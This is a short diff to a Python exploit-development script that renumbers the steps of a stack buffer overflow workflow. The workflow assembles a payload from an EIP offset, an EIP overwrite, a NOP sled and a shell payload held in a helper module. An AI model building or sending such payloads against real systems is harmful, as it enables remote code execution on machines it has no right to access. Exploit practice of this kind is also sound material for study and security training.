@@ -61,13 +61,13 @@ def main(*args):
     elif step == 6:
         payload = md.eip_offset + md.eip_overwrite + md.nop_sled + md.eip_post
 
-    elif step == 6.5:
+    elif step == 7:
         md.make_the_shell(args[1])
         sys.exit()
 
     # step 7 generating and sending the payload
     # SINGLE STAGE payload type
-    elif step == 7:
+    elif step == 8:
         payload = md.eip_offset + md.eip_overwrite + md.nop_sled + md.the_shell()
 
     try:
@@ -93,5 +93,5 @@ if __name__ == "__main__":
     # main(4)
     # main(5)
     # main(6)
-    # main(6.5, 2)
-    # main(7)
+    # main(7, 2)
+    # main(8)
